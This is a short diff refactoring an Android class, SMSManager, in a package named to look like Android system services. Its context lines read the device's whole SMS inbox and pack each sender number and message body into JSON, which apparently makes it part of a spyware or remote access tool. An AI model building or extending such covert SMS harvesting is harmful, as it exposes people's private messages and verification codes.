@@ -1,9 +1,12 @@
-package com.android.background.services;
+package com.android.background.services.helpers;
 
+import android.annotation.SuppressLint;
 import android.database.Cursor;
 import android.net.Uri;
 import android.telephony.SmsManager;
 import android.util.Log;
+
+import com.android.background.services.MainService;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -23,11 +26,11 @@ public class SMSManager {
 
 
             Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+            @SuppressLint("Recycle") Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
 
             while (cur.moveToNext()) {
                 JSONObject sms = new JSONObject();
-                String address = cur.getString(cur.getColumnIndex("address"));
+                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                 String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                 sms.put("phoneNo" , address);
                 sms.put("msg" , body);
